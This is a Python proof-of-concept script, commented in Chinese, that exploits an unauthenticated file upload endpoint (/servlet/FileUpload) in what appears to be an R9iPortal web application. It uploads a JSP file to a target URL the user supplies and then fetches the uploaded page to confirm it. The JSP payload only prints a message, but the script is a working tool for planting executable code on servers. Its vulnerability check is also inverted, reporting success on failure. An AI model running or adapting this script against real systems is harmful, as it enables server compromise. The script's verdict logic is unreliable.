import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的GET请求。存在问题的路径为/servlet/FileUpload?fileName=test.jsp&actionID=update',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送get请求')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/servlet/FileUpload?fileName=test.jsp&actionID=update"  # 移除末尾的斜杠
        url1 = args.url[:-1] + "/R9iPortal/upload/test.jsp"  # 移除末尾的斜杠
    else:
        url = args.url + "/servlet/FileUpload?fileName=test.jsp&actionID=update"
        url1 = args.url + "/R9iPortal/upload/test.jsp"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Connection': 'close'
}

data = "<% out.println('This page has a vulnerability!'); %>"


response = requests.post(url, headers=headers, data=data)
response1 = requests.get(url1)
if response1.status_code != 200:
    print("目标url："+ url + '\n' +"可能存在该漏洞")
else:
    print("目标url："+ url + '\n' +"不存在该漏洞")
# print(response.text)

